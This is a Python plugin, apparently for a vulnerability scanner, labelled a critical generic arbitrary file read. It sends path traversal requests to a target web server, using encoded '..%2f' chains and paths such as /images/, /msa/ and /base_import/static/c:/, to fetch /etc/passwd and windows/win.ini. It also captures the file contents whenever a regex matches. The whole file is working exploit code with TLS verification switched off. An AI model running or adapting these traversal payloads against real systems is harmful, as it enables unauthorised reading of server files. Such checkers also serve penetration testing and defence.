#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '通用任意文件读取',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini','/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd']
  target3 = '/images/../../../../../../../../etc/passwd'
  target4 = '/../etc/passwd'
  target5 = '/msa/../../../../etc/passwd'
  target6 = '/base_import/static/c:/windows/win.ini'
  url1 = url + targets[0]
  url2 = url + targets[1]
  url3 = url + target3
  url4 = url + target4
  url5 = url + target5
  url6 = url + target6
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    return ret
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      ret['url'] = url2
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    return ret
  try:
    res=requests.get(url=url3,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      ret['url'] = url3
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    return ret
  try:
    res=requests.get(url=url4,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      ret['url'] = url4
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    return ret
  try:
    res=requests.get(url=url6,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      ret['huixian'] = res.text
      ret['url'] = url6
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    return ret
  try:
    res=requests.get(url=url5,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['url'] = url5
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret